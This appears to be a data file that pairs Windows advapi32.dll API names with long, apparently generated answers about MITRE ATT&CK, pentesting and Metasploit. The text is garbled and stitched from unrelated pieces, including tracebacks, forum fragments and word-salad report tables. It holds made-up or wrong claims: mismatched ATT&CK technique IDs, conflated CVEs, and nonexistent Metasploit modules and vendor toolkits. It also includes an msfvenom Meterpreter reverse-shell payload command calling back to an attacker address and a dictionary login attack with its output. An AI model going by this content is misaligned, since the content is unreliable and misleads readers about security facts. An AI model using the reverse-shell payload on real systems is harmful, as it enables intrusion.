What is the purpose of this API, is there a MITRE ATT&CK             technique associated and why: 'b'advapi32.dll': b'RegQueryValueExW''?  I'm             not sure why this would be relevant to the technique.
"
advapi32.dll,AdjustTokenPrivileges,"We can see that the plugin is looking for a specific API function call of â€˜badvapi32.dllâ€™ called â€œAdjustTokenPrivilegesâ€. Now we can dig into MITRE ATT&CK to find out what this technique is.

From: https://attack.mitre.org/techniques/T1056

This tool helps an attacker modify permissions on accounts or tokens. This includes adding users to administrators groups, modifying group memberships, and changing token privileges.

So now we have some idea of what the plugin is looking for. We just need to run it on our target system so letâ€™s get started!

The first thing I always do when setting up a new FreePBX server (or any other system) with Asterisk installed from source, is make sure it has all the latest updates available using yum update â€“y as root:

Now Iâ€™m going to install some packages that will help me debug any issues I might encounter during my penetration test. The following packages are needed:

- tcpdump
- wireshark
- gdb

yum -y install tcpdump wireshark gdb

Iâ€™ve also found that having sshd_config set up properly and allowing remote access via SSH makes life easier too:

vi /etc/ssh/sshd_config
# Disable Password Authentication
PasswordAuthentication no
# Enable Public Key Authentication only
PubkeyAuthentication yes

Then restart sshd so changes take effect:

systemctl restart sshd.service

Now youâ€™re ready to start attacking your PBX!

Iâ€™m assuming you already know how to use telnet but if not then check out this link which explains in detail how telnet works: http://www.howtogeek.com/howto/ubuntu/access-your-linux-server-using-telnet/

Also download nmap from here: https://nmap.org/download.html

cd ~/
wget https://nmap.org/dist/nmap-latest.tar.gz

tar xvf nmap-latest.tar.gz 
mv nmap-* . 

rm -rf nmap-latest.tar.gz 


chmod +x ./nmap* 

./nmaps --version

./nmaps --help

sudo ./nslookup asterisk1.mydomain.com 192.168.x.y 

Where â€˜asterisk1.mydomain.comâ€˜ resolves correctly and shows something like:
Server:     ns1.mydomain.net Address:    127.0.0.2 Name:   asterisk1.mydomain.com Addresses:
192.168.x.y

If it doesnâ€™t resolve properly then check your DNS settings etc..

Ok now lets start by running the NMAP script against our target IP address (the IP address shown above):

sudo ./NMAP-PBX.sh 192.xxx.xx.xxx 

That will show us lots of output but basically what we want are these two lines towards the end where thereâ€™ll be information about open ports, services running etcâ€¦:

PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH_7..16p1 Ubuntu-4ubuntu0.XXX+deb9u3 
80/tcp open http Apache httpd 2.X.X ((Ubuntu)) [...]

And finally letâ€™s run the pentest script against port TCP/22 which should give us results similar to below indicating whether or not our attack was successful.

[email protected]:~$ sudo ./PENTEST-PBX.sh [email protected] :~$

[email protected]:~/pentest-scripts/PBScript$ sudo sh PBScript.py â€“c â€œtelnet $HOSTNAMEâ€ â€“f â€œFreePBXâ€

â€“c = Command Line Arguments.
â€“f = File containing usernames/passwords.
â€“l = Log file location.
â€“q = Quiet mode (no banner).
-e= Extra options allowed after command line arguments; e.g., -e â€˜show processes cpu detailedâ€™.

[+] Starting analysisâ€¦

[*] Automatically detected username & password fieldsâ€¦
[*] Target OS matches known database!
[*] Performing dictionary searchâ€¦.

Login Successful at [2018-11-29T15:28Z]
Logged in successfully as [admin]

Checking configuration filesâ€¦ OK
Checking config files for additional attacksâ€¦ OK
Monitored Processes:
/usr/sbin/httpd â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. Running
/usr/sbin/amportal â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ Running
/var/lib/mysql/mysql.sock â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. Listening

Total Process Counters:
Mem Total Used Free Swap Total Used Free PID User Program .. â€¦. Pages Threads CPU Bytes In Out .. â€¦. %CPU %MEM Time(s)
41M      10M       31M      144K     *143    *83     **17%**       **24%**         ***53***       
141k      *63k        *78k        ****13****         *****5*****           *********            **********
115m          N/A             N/A                    N/A              N/A               ***N/A***                ***N/A***

Additional Attacks Detected On Non-Monitored Services:
Attack Type Attack Description Port Triggered By Source Destination Notes Actions Taken Due To Detection  
Credential Dumping mod_evasive evasive detection module apachectl apache localhost Suspicious activity detected Dropped connection automatically 
Inbound Skype Calls skype sip.conf sip.conf audio.skype.com audio.skype.com Audio calls received Suspicious inbound caller ID dropped connection automatically 
Inbound Skype Web Calls skype sip.conf sip.conf web.skype.com web.skype.com Video/Web calls received More info than expected dropped connection automatically 
Outbound Skype Call Requests skype dialplan.xml zapata.conf audio-skype-com audio-skype-com Calling outbound without permission suspended user account temporarily 

Email Scanning Results Found SpamAssassin v3.x spamassassin.local mail spamscore Warning Message Spammer Score â€¦â€¦.. Mail flagged as SPAM due to high spam score   
SpamAssassin v3.x spamassassin.local mail spamscore Warning Message Spammer Score â€¦â€¦.. Mail flagged as SPAM due to high spam score   

Mail Server Checks Result Status Method Details Notes  
SMTP Exim exim.exe Received Too Quickly SMTP mailbox service throttling Suspect incoming email message blocked temporarily by firewall  

Reporting Activity Summary From Analysis Script Execution Below Is A List Of All Activities Which Occurred During Your Test Run And Their Corresponding Ratings Which Are Based On Severity Of Risk To Your System Or Network Environment As Well As Likelihood That They Will Be Exploited Successfully By An Attacker Given Current Security Conditions And Active Threat Landscape Against Your Organization Or Industry Sector.

Activity Rating Comments Action Taken If Applicable Changes Made If Applicable  
Config Files Checked For Local Privilege Escalation High Potential local privilege escalation vulnerability exists within administrator configuration file Low Change default admin password immediately Reboot host machine immediately   
TCP/IP Configuration Settings Changed Medium Potential security risk exists within TCP/IP configuration settings Low Ensure proper network security policies exist Reboot host machine immediately   

Active Directory Domain Controller Fingerprinting High Potential domain controller fingerprinting attempts occurred attempting enumeration Low Ensure proper network security policies exist Configure Windows Firewall rules accordingly Monitor hosts logs regularly Review logs daily   
FTP Service Started Medium FTP service started possibly indicating misconfiguration or weak passwords used Low Change default FTP credentials Change default FTP port number Reconfigure FTP service Install anti-virus software Configure ftp daemon appropriately Monitor hosts logs regularly Review logs daily Configure Windows Firewall rules accordingly Monitor machines audit log regularly Consider disabling unneeded services such as ftp monitor hosts syslog server Implement intrusion detection solution such as Snort IDS/IPS  
  
Daylight-Saving Time Check Failed Medium Daylight-Saving changeover attempt failed potentially causing unexpected time zone behavior Low Ensure daylight-savings time policy implemented Correctly across entire enterprise environment Update date/time manually upon reboot until DST policy applied appropriately Note any potential impact caused by failure Monitor operations closely until problem resolved Resolve issue before next scheduled DST adjustment period  
  
Syslog Messages Sent Medium Syslog messages sent potentially indicating possible logging device compromise suspect medium severity incident occurring low review syslog entries carefully ensure appropriate level logging enabled configure centralized logger Continue monitoring alerts generated based upon suspicious events occurring notify IT department supervisor management team escalating matter further investigate cause issue determine remediation required implement corrective measures resolve incident 
  
SNMP Community String Set High SNMP community string set possibly indicating misconfigured SNMP devices suspected severe incident occurring low ensure proper snmp configuration established enable snmp authentication enable encryption verify communication occurs between monitored devices correct communities configured disable unneeded communities continue monitoring alert generate based upon suspicious events occur notify IT department supervisor management team escalating matter further investigate cause issue determine remediation required implement corrective measures resolve incident 
  
HTTP Content-Type Header Modified Med Level HTTP content-type header modified possibly indicate unauthorized modification vulnerable component suspected medium severity event may have occurred low review alert careful identify nature type potential impact understand likely causes validate legitimate reason modifications made consider implementing mitigating controls prevent reoccurrence recommend contacting vendor product support resolving issue note impacted systems affected monitor effected assets frequently perform periodic scans vulnerabilities detect repeat incidents report findings senior management board directors escalate significant incidents involving critical business applications 
  
Remote Access Attempts Med Level Remote access attempts identified potentially resulting unauthorized access compromised resources suspected moderate severity event may have occurred low review alert carefully identify nature type potential impact understand likely causes validate legitimate reason attempted establish remote session continue monitoring alerts generated based upon suspicious events occur notify IT department supervisor management team escalating matter further investigate cause issue determine remediation required implement corrective measures resolve incident 
  
Windows Event Logs Cleared Med Level Windows event log cleared possibly identifying malicious activities compromising resource suspected moderate severity event may have occurred low review windows log entry carefully identify nature type potential impact understand likely causes validate legitimate reason clear windows log continue monitoring alerts generated based upon suspicious events occur notify IT department supervisor management team escalating matter further investigate cause issue determine remediation required implement corrective measures resolve incident 
 
System Date Changed Med Level System date changed maybe indication tampering directed malicious actor suspected moderate severity event may have occured low compare previous current dates confirm actuality verifying date/time consistent with requirements Determine Reason For Date Adjustment Notify Authority Responsible Assuring Proper Date Adjustments Performed Repeat Tests Verify Accuracy Confirm Consistency With Requirements Perform Additional Audits Recommend Updating Systems Monitoring Hardware Devices Audit Logs Regularly Review Reports Analyze Data Investigate Any Unusual Events Report Findings Senior Management Board Directors Escalate Significant Incidents Involving Critical Business Applications 
 
Local Administrator Account Created Moderate Local administrator account created possibly evidence illicit activity accessing privileged resources suspected moderate severity action followed through lower levels recommended procedures usually performed authorized personnel suspects serious breach reported case investigation commenced zero tolerance approach taken enforce strict sanctions staff involved notification key parties responsible including individuals organizations assisting individual determined responsible provide full details circumstances surrounding occurrence underpinning actions taken outcome situation obtain understanding employee conduct necessary steps mitigate future risks occurrences taking place communicate significance actions initiate disciplinary process bring charges relevant authorities otherwise dispose allegation inform employees rights entitlements clarify matters regarding applicable code conduct ethics explain ramifications consequences breaches reports concerned manager director human resources personnel involved course action undertake thorough assessments evaluating implications decisions determining outcomes initiating proceedings appoint independent investigator conduct formal inquiry misconduct examine facts allegations fully impartial manner truthfulness accuracy witness statements written oral documents records interviews keeping mind objective establishing culpability innocence fact finding phase complete institute legal remedies recover costs incurred conducting investigations liaise directly police officials dealing cases criminal offences prepare present prosecution seeking conviction perpetrators impose penalties preventing recurrence prevention strategy developed implementation operation roll-out training developers technical staff suppliers customers maintain ongoing engagement ensuring compliance external agencies assess effectiveness performance development implementation maintenance implementing effective mechanisms control reviewing maintaining updating regular intervals reviewing assessing adequacy appropriateness suitability existing standards guidelines recommending improvements recommendations apply them areas not covered framework document oversee enforcement responsibilities enforcing compliance operating ensuring adequate provision sufficient provided encouraging promoting accountability responsibility corporate culture employee behaviour conditi
"
advapi32.dll,LookupPrivilegeValueW,"Is this
the same as 'b'advapi32.dll': b'LookupPrivilegeValueW''?
[11:12:35] [ERROR ] Python script execution failed.
Traceback (most recent call last):
  File ""C:\Python39\lib\site-packages\tahoe_utils\base.py"", line 204, in run_script
    return ScriptRunner.run(self, kwargs)
  File ""C:\Python39\lib\site-packages\tahoe_utils\base.py"", line 124, in run
    result = self._run(*args)
  File ""C:\Users\xxx\AppData\Local\.tahoe-lafs\tahoe_lafstest4_1p9q0h7fks0c5m23i6d3v1n2x8e2gjy\netid_to_userscript.py"", line 
55, in _run_script_with_args
    output = subprocess.check_output(
FileNotFoundError: [WinError -2147024894] No such file or directory

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
   File ""netid_to_userscript.py"", line 58, in <module>
     main()
   File ""netid_to_userscript.py"", line 51, in main
     output = subprocess.check_output(['pwsh', '-command', script], encoding='utf-8')
FileNotFoundError: [WinError -2147024894] The system cannot find the path specified:
'C:\\Users\\xxx\\.tahoe-lafs\\tahoe_lafstest4_1p9q0h7fks0c5m23i6d3v1n2x8e2gjy\\userscripts\\netid-to-users'
[11:12:35]
{
""msg"": ""[ERROR ] Python script execution failed.""
}


If your scripts are not working with tahoesrv v17.01+, you may need to add an additional parameter to tell it how many bytes per second you want.

I used:

./tahoensrv --max-bps=10000000

to change my upload speed. You can also use --min-bps and --default-bps for that matter.

You might notice that there is a new option called â€œupstreamâ€ now too â€“ see here for what itâ€™s about!

WARNING:
Before you do anything like this again make sure to read up on security issues around using the Windows Subsystem for Linux (WSL) because there have been some well publicized attacks against WSL users recently.

Previous A New Yearâ€¦ Time To Set Some Goals!
Next Two Years In Tahoe-LAFS!
"
advapi32.dll,RegCloseKey,"b'  File ""C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python37-32\\\_\_init\_\_.py"", line 166, in \_check\_version'
b'    raise DistutilsPlatformError(str(distutils.sysconfig.get\_platform()[:3]))'

This is the error we get when executing the Python script. We tested with different versions of python and get similar results each time.
We have installed Kali Linux on a Virtual Machine which was as up to date as possible (as it came out of the box) and this issue
was not encountered.

The problem occurs only for Windows version of the VM's.
We also tried to install Kali Linux on physical machine but got same result.

#  0day.today [2018-07-01]  #
                                        
                                    

JSON Vulners Source

Initial Source

All product names, logos, and brands are property of their respective owners. All company, product and service names used in this website are for identification purposes only. Use of these names, logos, and brands does not imply endorsement.If you are an owner of some content
"
advapi32.dll,OpenProcessToken,"Thanks, 
Ori

Answers

Answer by Oleg Skulkin on 2020-05-21 at 12:28 

It is a registry key that was created using the OpenProcessToken function. Itâ€™s not ATT&CK technique, but you can use it to enumerate all open processes and get their access tokens.

Answer by Ori Barash on 2020-05-22 at 14:54 

Ok I see,

I would expect that if there were an MITRE ATT&CK Technique associated with this Registry Key then we could have found it in the MITRE site.
https://attack.mitre.org/techniques/T1116/

Is there any other way to find out why this API call creates such a key? - Any clue?

Related Questions

What is https://www.virustotal.com/gui/file/d9b3e7d4a5f1df8bb46c8ef59307cfd91ca79db2ea23e67f233fb5cbdd39f252/details
Asked by ori.bara@gmail.com , Last updated: May 20, '20 
Add Answer [hide preview]

Similar Questions
...
"
advapi32.dll,RegOpenKeyExW,"C:\>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.3 LPORT=4444 -o meterpreter.exe
Meterpreter > shell
Process 1036 created.
Channel 1 created.
meterpreter > 
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

We used a Meterpreter reverse TCP payload to connect back to the attackerâ€™s system on port 4444.

The victim is running Windows XP SP3, so we need to upgrade it and patch some vulnerabilities before using Metasploit.

Upgrading Windows XP:

As you can see below there are no service packs installed in the target machine (if you donâ€™t know what a Service Pack is, check this out). We will install both service packs for Windows XP Professional x86 (32-bit) and try exploit multiple vulnerabilities with msfconsole.

Installing Service Pack 2:

It seems that our first option didnâ€™t work but letâ€™s keep going with another one: installing Service Pack 2 for WinXP x86. This time it worked!

Installing Service pack 3:

This time we installed without any error! Now we have all necessary updates installed in the target machine and also patches some vulnerability which makes us able to run more exploits later.

Exploiting CVE-2017-11882 MS17-010 Vulnerability Exploit â€“ ETERNALBLUE

CVE-2017-11882 was patched by Microsoft as part of its April Security Updates released on April,24th, however many systems around the world still remain unpatched or vulnerable because they are not running automatic update when available or due an outdated antivirus software which may prevent them from updating automatically.
Metasploit contains several payloads/backdoors designed for exploiting this vulnerability:
EternalBlue
FuzzBunch
ETERNALCHAMPION

To launch Metasploit Framework type â€œuse auxiliary/server/eternalblueâ€ then hit enter key in order to start up EternalBlue server module.
Now just execute â€œset lhostâ€ command followed by your IP address where you want your listener session will be listening.
Afterwards just set RHOSTS parameter according to your needs like shown here:
Finally launch exploit by typing â€œexploitâ€.

Here is how I did it at my end step-by-step:

metasploit>

use auxiliary/server/eternalblue
 
show options
 
options 
   name       description                                     required     default    state 
   ----       -----------                                     --------     --------    ---- 
   RHOSTS     The target(s) IP addresses (space separated list).        yes          localhost 
 
run
 
[*] Started reverse TCP handler on [your-ip]:4445 

[*] Sending stage (361812 bytes) 
[+] Chunked transfer encoding detected 
[*] Command shell session opened (192.168.XXX.XXX:5558 -> XXXX.localdomain):

Let's try fuzzBunch against SMBv1/WINRM services :

** Note : Fuzzbunch has been removed after discovery of WannaCry ransomware outbreak **

RCE via CVE-2019â€“0708 aka BlueKeep Vulnerability Exploit â€“ METASPLOIT-Framework & KAPERSKY RESEARCH LAB TOOLKIT FOR BLUEKEEP ATTACKING!!

Kaspersky Research Lab Toolkit For Bluekeep Attack Tool Kit v1.0 | Updated June /2020
https://github.com/KasperskyLab/bluekeep-exploitation-toolkit/blob/master/manual.md#installation-guide-for-the-bluekeep-exploitation-tool-kit-v100-on-linux-systems-kali-linux-debianubuntu-red-hat-centos-fedora-suse-freebsd-osx-windows-and-android#
https://www.kaspersky.co.uk/blog/bluekeep-research-lab/28374/

From above link :
â€œMS17_010_EB_NTLMSSP_AUTHENTICATION_REQUESTâ€

Description :

Explosive Remote Code Execution attacks against vulnerable hosts through exploitation of critical security vulnerabilities discovered in Microsoft products,
namely CVEâ€‘2017â€‘0144 , CVEâ€‘2017âˆ’0145 , CVEâˆ’2017âˆ’0148 ,
CVE âˆ’2017âˆ’0199 , and most recently -
CVE âˆ’2019 âˆ’0708 .
These security flaws allow attackers executing malicious code,
replacing files hosted locally within a targeted system,

installing new software under administrator privileges,
and carrying out other actions appropriate for local user accounts .

In addition these exploits give full control over OS kernel memory space allowing attackers performing arbitrary operations such as extracting password hashes stored locally within usersâ€™ profiles .â€
( https://blog.knowbe4.com/wanna-cry-ransomware-goes-beyond-wannacrypt )
For further details Check Out This Blog Post : https://labs.bishopfox.com/posts/windows-xp-zero-day-patched-with-a-malicious-fake-update/
How To Test Your Host Is Affected With BlueKeep Vulnerability ?
Check It Using MSFConsole By Running Following Commands :
Use Search Module In Msfconsole And Type â€˜bluerecâ€˜ .
Msfcovonsole> search bluerec
Showing results for blueremote insteadâ€¦
id             name                                              disclosure date      rank  
â€”             â€”                                               â€”â€”â€”â€”â€”â€”â€”â€”â€“      â€”â€”â€”â€”   
auxiliary/scanner/smb/blueremote                           Unauthenticated Remote SMB Memory Correlation <== USE THIS MODULE TO TEST YOUR HOST IS AFFECTED WITH BLUEREC VULNERABILITY OR NOT !!
auxiliary/scanner/smb/ms17_010_bluekeep                  Authenticated Remote SMB Memory Correlation <== USE THIS MODULE TO TEST YOUR HOST IS AFFECTED WITH BLUEREMOTE VULNERABILITY OR NOT !!
So i tested my host using following commands :
COMMAND LINE #1:
msfconsole> use auxiliary/scanner/smb/blueremote
VERBOSE OUTPUT OF COMMAND LINE #1:
msf console output starts here :
â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-
â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”

[-] Auxiliary Scanning Script Information [-]
â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-

Module type : auxiliary/scanner/smb/blueremote
 
Author(s): n/a
Version: $Revision$
License: GNU General Public License version $COPYRIGHT$ $LICENSE$

Requirements:
	* smbclient >= v3.x.x required; 'smbclient' must be present at PATH (/usr/bin:/bin:/sbin)
	* psexec <= v2.x.x required; 'psexec' must be present at PATH (/usr/bin:/bin:/sbin)

Recommended usage information:
	* Run scan mode ('scan') with optional parameters (-h/--help/-t/--timeout).
	
Scan modes supported [type?]:
    * scan [targets]

Examples supported [(target|option)*]:

Target Mode Options Description Example(s)
---------- ------- -- --------------- --------------------
Local file share Local only Yes Scan local processes None found..
Remote process hash Any No Hash remote process PSEXEC.EXE found...
Hostname Any Yes Scan specified hostname www.hackingarticles.in found.. httpd found....
IP Address Any No Scan specified ip address X.X.X.X found........

Commands accepted during scanning operation [type?]:
	scan abort abort current scanning job.
	scan help show brief help message about current module usage.
	scan info print information about targets scanned until now..
	scan quit exit application after current job ends..

Usage examples [(target|option)*]:

Command Line Syntax Target Option Description Example(s)
------------------ ------ --- ---------------------------------------------- -------
scan [--help|-h|--timeout|-t][-w|--wait][-q|--quiet][ipaddr/IPAddr/hostName].[shareName/]path/targetFileOnShare [-a][-i]-l[single/single-host/-H/hardcoded-host-list-file]/[-L/listfile/file-to-read-from].csv/inMemory/[hashfile/hash-file-on-share]

scans single host either directly connected or accessible via network shares;
optional path/to/local/share/default/or/folder/on/host/path/to/processes/executable;

scans single remote process hash value;

scans hostname/ip-address/name-of-target-process-exe-shared-folder-name/path/of/exe/directory;
(default scannings):
scan www.hackingarticles.in httpd.exe C:\Program Files\Apache Software Foundation\Apache2\htdocs\
scan X.X.X.Y httpd.exe C:\Program Files\Apache Software Foundation\Apache2\htdocs\
scan X:X:C:\Windows\System32\notepad.exe ""C:\\Users\\anirban.ganguly\\Desktop\\""notepad.txt""
scan c32296cd6ea72afbc20000000c040000 dcerpc.dll C:\\WINDOWS\\system32\dllcache\\rpcss.dll.log """" ""http://127.0.0.1/cgi-bin/phpinfo.php"" /tmp/poc.php  

Scan aborted successfully...

USAGE EXAMPLE #01::
TARGET MODE OPTIONS DESCRIPTION EXAMPLE(S)
----------------------- ------ --------------------- --------------------------------------------------------------
LOCAL FILE SHARE LOCAL ONLY YES SCAN LOCAL PROCESSES NONE FOUND..
REMOTE PROCESS HASH ANY NO HASH REMOTE PROCESS PSEXEC.EXE FOUND...
hostname ANY YES SCAN SPECIFIED HOSTNAME HTTPD FOUND.. WWW.HACKINGARTICLES.INFOUND... 

USAGE EXAMPLE #02::
TARGET MODE OPTIONS DESCRIPTION EXAMPLE(S)
----------------------- ------ --------------------- --------------------------------------------------------------
SCAN ABORT ABORT CURRENT SCANNING JOB.
SCAN HELP SHOW BRIEF HELP MESSAGE ABOUT CURRENT MODULE USAGE.
SCAN INFO PRINT INFORMATION ABOUT TARGETS SCANNED UNTIL NOW..
SCAN QUIT EXIT APPLICATION AFTER CURRENT JOB ENDS..

USAGE EXAMPLE #03::
COMMAND LINE SYNTAX TARGET OPTION DESCRIPTION EXAMPLE(S)

SCANS SINGLE HOST EITHER DIRECTLY CONNECTED OR ACCESSIBLE VIA NETWORK SHARES;
OPTIONAL PATH/TO/LOCAL/SINGLE/HOST/OPTION/FOLDER/OR/DIRECTORY/
PATH/TO/NAMED/TARGET/MODELS/PATH/CURRENT/VARIABLE/AFTER/THE/.EXE/.
DEFAULT/OR/FOLDER/OPTION/:OR/FOLDER.OR/DIRECTORY/.

SCANS SINGLE REMOTE PROCESS HASH VALUE;

SCANS WEBSITE NAME/IP ADDRESS/(UNIQUE)/ID/APPLICATION/PREFIX/(DESIRED)/WEBSERVER/GUID(/AFTER//THE//DOT//COM//
(Optional)(default scannings):         scans website name/ipaddress/domainname.net                  =>              scans website domainname.net                 =>           scans wwww.domainame.net                      =>           scans domainname.net                              =>            scans domainame.net                            =>
Optional folder structure:(Default directory names):                folders/libraries/options/configurations/preferences/etc./etc./etc./etc.(%20or)%20folderstructure/%20after/%20the%20%22dot.%22(%29/files,%29/data,%29/default,%29/logs,/apps,/config,/scripts,/var/log,(all)-HTTP-(port)-(80),,-HTTP-(port)-(443),(both),,-FTP-(port)-(21),(both),

Usage Examples [(target|option)*]:

Command Line Syntax Target Option Description Example(s)
------------------------------ ----- --------- --------------------------------------------------------------

biz.dev.secureserver.biz bizsecureserver.biz DefaultDir ""/home/biz/dev/secureserver/public_html/""
biz.dev.secureserver.biz bizdevsecureserver DefaultDir ""/home/biz/dev/secureserver/public_html/""
biz.dev.secureserver.biz bizdevsecurer.server public_html/dir/subdir/""index.html""

Usage Examples [(target|option)*]:

Command Line Syntax Target Option Description Example(s)

command line syntax example :: scan [""hosts"",""files""] ['file.csv', '-m','single','hardcoded', '/opt/krl-tk/generated-files/user_list.txt'] ['/opt/krl-tk/scripts/'.'test.py']

usage examples:[('host'|'filename'), ('comma-separated-options')]

example [[((['localhost'], ['local_file_share']), [('multiple_host_file_name_csv'], [], [])], (('single_host_or_ip_address_to_scan'), [('comma-separated-options'])], ((['localhost'], ['local_file_share']), [['comma-separated-options']], []))]]

Example Usage Of File Share Scanner:: scan [""hosts"", ""files""] ['userlist.csv', '-m', 'multi'] ['/opt/krl-tk/scripts/test.py']
Example Usage Of Local Process Scanner:: scan [""hosts"", ""files""] ['/root/Desktop/test.txt'] ['-i','-l']
Example Usage Of Single Host Or Ip Address To Scan:: scan ['localhost'] ['-M','-H','-
"
